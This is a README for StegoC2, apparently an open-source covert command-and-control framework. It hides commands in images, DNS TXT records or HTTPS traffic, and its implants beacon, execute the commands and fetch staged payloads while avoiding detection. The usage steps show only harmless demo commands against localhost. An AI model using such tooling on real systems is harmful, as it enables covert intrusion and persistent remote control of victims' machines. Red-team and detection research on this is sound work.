# StegoC2

StegoC2 is a covert command-and-control (C2) framework that transmits commands via steganography (in images), DNS TXT records, or HTTPS channels. It supports staging, encryption, and implant beaconing while avoiding common detection mechanisms.

---

## Features

* Covert command delivery via:

  * Image-based steganography
  * DNS TXT records
  * HTTPS web endpoint
* Modular implant that supports:

  * Periodic beaconing
  * Command execution
  * Remote payload staging
* AES-encrypted payloads (optional)
* Cross-platform implant (Python)

---

## Folder Structure

```
StegoC2/
├── main.py                    # CLI launcher
├── stego_c2.py                # Embed/extract commands in PNG
├── dns_c2.py                  # DNS TXT-based C2 channel
├── https_c2.py                # HTTPS C2 fallback
├── implant.py                 # Implant beacon logic
├── staging.py                 # Remote payload delivery
├── encryption.py              # AES support
├── config.py                  # Config constants
├── utils.py                   # Helpers
├── requirements.txt           # Dependencies
│
├── c2_server/
│   └── server.py              # Flask-based HTTPS control panel
├── implants/
│   ├── stager_stub.py         # Lightweight loader
│   └── full_implant.py        # Full agent
├── test_vectors/
│   ├── sample_carrier.png     # Carrier image
│   └── encoded_command.png    # Result with hidden data
├── output/
│   ├── extracted_commands.txt
│   └── beacon_log.txt
├── tests/
│   ├── test_stego_c2.py
│   ├── test_dns_c2.py
│   ├── test_encryption.py
│   ├── test_implant.py
├── screenshots/
```

---

## Setup

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

---

## Step-by-Step Usage Guide

### 1. Create a carrier image

```bash
python3 -c "from PIL import Image; Image.new('RGB', (300, 300), color=(255,255,255)).save('test_vectors/sample_carrier.png')"
```

### 2. Embed a command (e.g. `echo hello`) into the image

```bash
python3 -c "from stego_c2 import embed_command_in_image; embed_command_in_image('echo hello', 'test_vectors/sample_carrier.png', 'test_vectors/encoded_command.png')"
```

### 3. Run the implant to extract and execute the command

```bash
python3 main.py --mode implant --channel stego --verbose
```

Expected Output:

```
[*] Launching implant beacon over stego...
[stego_c2] Extracted command: echo hello
hello
[+] StegoC2 execution complete.
```

### 4. Check Output Logs

* `output/extracted_commands.txt` will contain: `echo hello`
* `output/beacon_log.txt` is written by the full staged implant

---

## Staging Mode

### 5. Start the HTTPS C2 server

```bash
python3 c2_server/server.py
```

This serves `implants/full_implant.py` over:

```
https://127.0.0.1:5000/stage
```

### 6. Run the lightweight stager

```bash
python3 implants/stager_stub.py
```

Expected Output:

```
[full_implant] Beacon executed
[full_implant] Beacon executed
...
```

---

## Testing

```bash
python3 -m unittest discover tests
```

All test modules:

* `test_stego_c2.py`: image embedding & extraction
* `test_dns_c2.py`: DNS client and stub
* `test_encryption.py`: AES encryption/decryption
* `test_implant.py`: beacon logic stub

---

## Author

Created by **mchyasn**

---

## License

MIT License
